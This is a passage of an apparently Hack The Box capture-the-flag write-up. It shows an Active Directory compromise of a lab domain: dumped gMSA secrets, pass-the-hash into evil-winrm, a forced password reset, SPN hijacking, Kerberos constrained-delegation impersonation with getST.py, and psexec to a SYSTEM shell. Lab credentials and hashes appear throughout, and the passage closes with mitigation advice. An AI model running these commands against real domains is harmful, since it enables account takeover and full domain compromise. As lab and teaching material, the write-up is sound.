 0060   B8 A9 41 0B 63 D8 09 EA  6E F1 67 F5 B5 41 D7 3C   ..A.c...n.g..A.<
 0070   3A C4 21 4D A2 2A 14 D9  79 82 C9 28 D9 1B B9 71   :.!M.*..y..(...q
 0080   FE 99 D4 80 9C 1E BD EA  E8 E7 69 C6 B3 37 7E E1   ..........i..7~.
 0090   A4 78 DF FB B2 DD C1 33  18 BE 13 11 67 D1 A4 A0   .x.....3....g...
 00a0   18 33 A4 C2 7E 05 12 69  0D 73 DE 1E 59 A0 17 61   .3..~..i.s..Y..a
 00b0   EC 7D 40 FC 18 82 05 0C  BF 43 9D 9C BB 28 1A 06   .}@......C...(..
 00c0   D4 BF 8D 85 D1 FE B2 74  0E C3 99 EC A0 E4 6E 36   .......t......n6
 00d0   99 0B 72 B2 C4 A6 4A E0  09 BA FB 3D FD 26 4F F7   ..r...J....=.&O.
 00e0   34 B6 3F B9 22 60 9E 8C  30 58 83 A7 5D 9A EF 75   4.?."`..0X..]..u
 00f0   CE 37 BC A0 91 04 36 59  0D 93 12 FC A4 6A D8 9A   .7....6Y.....j..
 0100   61 A8 9B DD C8 73 19 7D  E4 8E AB 3D 69 B9 E4 98   a....s.}...=i...
 0110   00 00 19 41 B0 1B 73 17  00 00 19 E3 DF 68 72 17   ...A..s......hr.
 0120   00 00                                              ..
_SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11:01000000220100001000000012011a01b6c4083911a28350b1fd6948803650e1b1c5741f7719b1f4ff926203dcdf4ec9c0369b7b92fe10a2d7ff953bfa406a3b6786523ed82767cc8fe2734af892e98efbef2b3476759032b4ecdef34276c363b8a9410b63d809ea6ef167f5b541d73c3ac4214da22a14d97982c928d91bb971fe99d4809c1ebdeae8e769c6b3377ee1a478dffbb2ddc13318be131167d1a4a01833a4c27e0512690d73de1e59a01761ec7d40fc1882050cbf439d9cbb281a06d4bf8d85d1feb2740ec399eca0e46e36990b72b2c4a64ae009bafb3dfd264ff734b63fb922609e8c305883a75d9aef75ce37bca0910436590d9312fca46ad89a61a89bddc873197de48eab3d69b9e49800001941b01b7317000019e3df6872170000
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

> — Do we got the Creds for a.white?. Yeeppp!
>
> — a.white:E2nvAOKSz5Xz2MJu

> — I tried to get the evil_winrm shell for a.white. but unfortunately it didn't worked. so i decided to get the shell for WEB01 Administrator.

```bash
proxychains evil-winrm -i WEB01.pirate.htb -u 'administrator' -H b1aac1584c2ea8ed0a9429684e4fc3e5
```

```text
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                            
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  WEB01.pirate.htb:5985  ...  OK
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd ..
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/15/2026   7:37 PM                a.white
d-----         6/9/2025  10:11 AM                Administrator
d-----         6/9/2025   6:55 AM                Administrator.PIRATE
d-----         6/9/2025   7:31 AM                gMSA_ADFS_prod$
d-----        1/15/2026   6:40 PM                gMSA_ADFS_prod$.PIRATE
d-r---         6/8/2025   1:29 PM                Public


*Evil-WinRM* PS C:\Users> cd a.white
*Evil-WinRM* PS C:\Users\a.white> cd Desktop
*Evil-WinRM* PS C:\Users\a.white\Desktop> ls


    Directory: C:\Users\a.white\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/7/2026   1:11 PM             34 user.txt
```

## Step 3 - Privilege Escalation

> — So according to the Bloodhound -->

```text
	a.white (angela white fr :) )
	    ↓
	ForcePasswordChange
	    ↓
	a.white.adm
   	    ↓
	 memberOf
	    ↓
       IT@Pirate.htb
	    ↓
	 writeSPN
	    ↓
	DC01.Pirate.htb
```

* This should be the clear attack path towards gaining access to the domain.

> — Attack Execution :-

* The First Step would be force Change Password of a.white.adm

```bash
bloodyAD --host DC01.pirate.htb -d pirate.htb \
    -u a.white -p E2nvAOKSz5Xz2MJu \
    set password \
    'a.white_adm' 'FluXionP@ssw0rd'
```

```text
[+] Password changed successfully!
```

* Now As we Know it has a writeSPN privilege to DC01.pirate.htb, lets look for Delegations 

```bash
nxc ldap dc01.pirate.htb -u 'a.white_adm' -p 'FluXionP@ssw0rd' --find-delegation
```

```text
LDAP        10.129.244.95   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never)                                         
LDAP        10.129.244.95   389    DC01             [+] pirate.htb\a.white_adm:FluXionP@ssw0rd
LDAP        10.129.244.95   389    DC01             AccountName AccountType DelegationType                     DelegationRightsTo       
LDAP        10.129.244.95   389    DC01             ----------- ----------- ---------------------------------- ---------------------------------------                                                      
LDAP        10.129.244.95   389    DC01             a.white_adm Person      Constrained w/ Protocol Transition http/WEB01.pirate.htb, HTTP/WEB01  
```

* Okay, so Found Delegation, we can request for a TGT/TGS for WEB01.pirate.htb, and then with that we can impersonate with any service (also DC01)

* Constrained Delegation WITH Protocol Transition-
Kerberos constrained delegation comes in two forms:
- Kerberos-only constrained delegation → Service can impersonate users only if they authenticated via Kerberos
- Constrained delegation WITH protocol transition → Service can impersonate users even if they authenticated via NTLM, Basic auth, Forms auth, or No Kerberos at all

> — So We need to do SPN hijacking + KCD

* Exploitation Path:-
```text
	a.white_adm
   	    ↓       (Constrained delegation + protocol transition)
	HTTP/WEB01 or HTTP/WEB01.pirate.htb
   	    ↓
	Abuse service privileges
   	    ↓
	Escalate to DC
```

> — now We know that HTTP service is only accessible via WEB01 and not by DC01.

```bash
bloodyAD -H DC01.pirate.htb -d pirate.htb \
    -u a.white_adm -p 'AxuraP@ssw0rd' \
    get object \
    'WEB01$' --attr servicePrincipalName \
    | grep HTTP
```

```text
servicePrincipalName: tapinego/WEB01; tapinego/WEB01.pirate.htb; WSMAN/WEB01; WSMAN/WEB01.pirate.htb; HOST/WEB01.pirate.htb; RestrictedKrbHost/WEB01.pirate.htb; HOST/WEB01; RestrictedKrbHost/WEB01; TERMSRV/WEB01.pirate.htb; TERMSRV/WEB01; HTTP/WEB01; HTTP/WEB01.pirate.htb
```

```bash
bloodyAD -H DC01.pirate.htb -d pirate.htb \
    -u a.white_adm -p 'AxuraP@ssw0rd' \
    get object \
    'DC01$' --attr servicePrincipalName \
    | grep HTTP
```

> — Here we can clearly see, that HTTP exists only in WE01. and no output for DC01, cause it doesn't exists there.

> — we need to somehow, make DC01 to be able to access the HTTP of WEB01.

> — As we know IT-Pirate has WriteSPN privilege over DC01, so we can add this new SPN.

> — First remove the SPN of WEB01 to HTTP

```bash
bloodyAD -H DC01.pirate.htb -d pirate.htb \
    -u a.white_adm -p 'FluXionP@ssw0rd' \
    msldap delspn \
    "CN=WEB01,CN=Computers,DC=pirate,DC=htb" \
    "HTTP/WEB01.pirate.htb"
```

> — Then Add the new SPN for DC01

```bash
bloodyAD -H DC01.pirate.htb -d pirate.htb \
    -u a.white_adm -p 'FluXionP@ssw0rd' \
    msldap addspn \
    "CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb" \
    "HTTP/WEB01.pirate.htb"
```

> — Lets Verify now -->

```bash
bloodyAD -H DC01.pirate.htb -d pirate.htb \
    -u a.white_adm -p 'AxuraP@ssw0rd' \
    get object \
    'WEB01$' --attr servicePrincipalName \
    | grep HTTP
```

```text
servicePrincipalName: tapinego/WEB01; tapinego/WEB01.pirate.htb; WSMAN/WEB01; WSMAN/WEB01.pirate.htb; HOST/WEB01.pirate.htb; RestrictedKrbHost/WEB01.pirate.htb; HOST/WEB01; RestrictedKrbHost/WEB01; TERMSRV/WEB01.pirate.htb; TERMSRV/WEB01; HTTP/WEB01
```

```bash
bloodyAD -H DC01.pirate.htb -d pirate.htb \
    -u a.white_adm -p 'AxuraP@ssw0rd' \
    get object \
    'DC01$' --attr servicePrincipalName \
    | grep HTTP
```

```text
servicePrincipalName: HTTP/WEB01.pirate.htb; Hyper-V Replica Service/DC01; Hyper-V Replica Service/DC01.pirate.htb; Microsoft Virtual System Migration Service/DC01; Microsoft Virtual System Migration Service/DC01.pirate.htb; Microsoft Virtual Console Service/DC01; Microsoft Virtual Console Service/DC01.pirate.htb; Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC01.pirate.htb; ldap/DC01.pirate.htb/ForestDnsZones.pirate.htb; ldap/DC01.pirate.htb/DomainDnsZones.pirate.htb; DNS/DC01.pirate.htb; GC/DC01.pirate.htb/pirate.htb; RestrictedKrbHost/DC01.pirate.htb; RestrictedKrbHost/DC01; RPC/21c2943d-6163-4df9-aff7-3d164aa2cfbb._msdcs.pirate.htb; HOST/DC01/PIRATE; HOST/DC01.pirate.htb/PIRATE; HOST/DC01; HOST/DC01.pirate.htb; HOST/DC01.pirate.htb/pirate.htb; E3514235-4B06-11D1-AB04-00C04FC2DCD2/21c2943d-6163-4df9-aff7-3d164aa2cfbb/pirate.htb; ldap/DC01/PIRATE; ldap/21c2943d-6163-4df9-aff7-3d164aa2cfbb._msdcs.pirate.htb; ldap/DC01.pirate.htb/PIRATE; ldap/DC01; ldap/DC01.pirate.htb; ldap/DC01.pirate.htb/pirate.htb
```

> — Great!, the HTTP is now accessible via DC01.

> — Now the KDC believes that  HTTP/WEB01.pirate.htb  →  DC01$ 

* So The Kerberos Flow might look like this --->
```text
a.white_adm
   │
   ├─ S4U2Self → impersonate Administrator
   │
   └─ S4U2Proxy → request ticket for HTTP/WEB01.pirate.htb
                     ↓
                Encrypted for DC01$
```

* What is S4U2Self?-->Usually, Kerberos requires a user's password to get a ticket. However, with S4U2Self, the account `a.white_adm` asks the Domain Controller (DC): "Hey, the Administrator just 'logged in' to me. Can you give me a service ticket for the Administrator to access... well, myself?"

* How S4U2Self Works (The Step-by-Step):-
  1. The Request: The Web Server (`a.white_adm`) sends a message to the Domain Controller (DC). It says: "I have authenticated Alice via a different method. Please give me a Kerberos Service Ticket for Alice to access my service."
  2. The Validation: The DC looks at its list of permissions. It asks: "Is `a.white_adm` allowed to do this?" This is controlled by a setting called `TrustedToAuthForDelegation`.
  3. The Delivery: If the server is trusted, the DC sends back a Service Ticket. This ticket says: "User: Alice | Service: a.white_adm".

* What is S4U2Proxy?---> `S4U2Proxy` is the "second jump." It’s how the service account (`a.white_adm`) actually uses the identity it just stole (the Administrator) to access a remote resource (WEB01).

* How S4U2Proxy Works (The "Second Jump")
  Once the service account has successfully completed S4U2Self, it holds a Service Ticket for the Administrator. Now it needs to go further.
  1. The Presentation: The service account (`a.white_adm`) goes back to the Domain Controller (DC).
  2. The Request: It says: "Look, I have this Service Ticket for the Administrator. I want to use his permissions to talk to the HTTP service on `WEB01.pirate.htb`."
  3. The Check (Constrained Delegation): The DC checks the properties of the `a.white_adm` account. It asks: "Is this account specifically allowed to 'delegate' to WEB01?" In a Windows environment, this is usually defined in the `msDS-AllowedToDelegateTo` attribute.
  4. The Ticket Grant: If the account is allowed, the DC issues a new Service Ticket.
  5. The catch: This new ticket is for the HTTP service on WEB01, but the name on the ticket is Administrator.

> — Now that we have everything, lets request for a TGS of Administrator

```bash
getST.py PIRATE.HTB/a.white_adm:'FluXionP@ssw0rd' \
    -spn HTTP/WEB01.pirate.htb \
    -impersonate Administrator \
    -dc-ip DC01.pirate.htb \
    -altservice CIFS/DC01.pirate.htb
```

```text
[*] Querying offset from: pirate.htb
[*] faketime -f format: +25153.605546
25153.605546s
[*] Running: getST.py PIRATE.HTB/a.white_adm:FluXionP@ssw0rd -spn HTTP/WEB01.pirate.htb -impersonate Administrator -dc-ip DC01.pirate.htb -altservice CIFS/DC01.pirate.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from HTTP/WEB01.pirate.htb@PIRATE.HTB to CIFS/DC01.pirate.htb@PIRATE.HTB
[*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
```

> — We Got a valid TGS for Administrator

> — Now Dominate the Domain!

```bash
psexec.py -k -no-pass DC01.pirate.htb
```

```text
[*] Querying offset from: pirate.htb
[*] faketime -f format: +25200.883669
25200.883669s
[*] Running: psexec.py -k -no-pass DC01.pirate.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on DC01.pirate.htb.....
[*] Found writable share ADMIN$
[*] Uploading file LGblabiJ.exe
[*] Opening SVCManager on DC01.pirate.htb.....
[*] Creating service Xsus on DC01.pirate.htb.....
[*] Starting service Xsus.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.8385]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type c:\users\administrator\desktop\root.txt
e*************************8
```

## Mitigation & Security Perspective

> [!CAUTION]
> **Active Directory Coercion and NTLM Relay (PetitPotam to LDAPS)**
> The machine `WEB01` was vulnerable to PetitPotam coercion, allowing an attacker to coerce computer account authentication and relay it to LDAPS on `DC01` to modify the Resource-Based Constrained Delegation (RBCD) configuration.
> **Mitigation:** Disable NTLM on the domain or restrict NTLM relaying. Enforce LDAP Signing and LDAP Channel Binding on all Domain Controllers to prevent relaying to LDAPS. Additionally, patch the EFSRPC / PetitPotam vulnerability and restrict RPC ports to authorized administrative workstations.

> [!CAUTION]
> **Constrained Delegation with Protocol Transition and SPN Hijacking**
> The attacker abused `writeSPN` permissions on the Domain Controller (`DC01`) to perform SPN hijacking, moving the `HTTP` service principal name from `WEB01` to `DC01`. They then used constrained delegation with protocol transition assigned to `a.white_adm` to request a service ticket for the Administrator to access `DC01` (specifically `CIFS/DC01.pirate.htb` via ticket alteration).
> **Mitigation:** Regularly audit Active Directory permissions for sensitive accounts and groups, paying close attention to `WriteSPN` (Write servicePrincipalName) rights over Domain Controllers or other tier-0 objects. Restrict delegated administrative rights. Ensure that sensitive accounts (such as Domain Admins) are flagged as "Account is sensitive and cannot be delegated" in their properties to block delegation impersonation attacks.

> [!WARNING]
> **gMSA Password Read Delegation**
> The Group Managed Service Account (gMSA) passwords (`gMSA_ADFS_prod$`) were readable by the `Domain Secure Servers` group, which included accounts compromised via Pre-Active Directory 2000 compatibility settings.
> **Mitigation:** Restrict the `PrincipalsAllowedToReadPassword` attribute on gMSAs to only the specific computer accounts that actually run the service. Audit and restrict memberships of pre-created and legacy Active Directory groups.
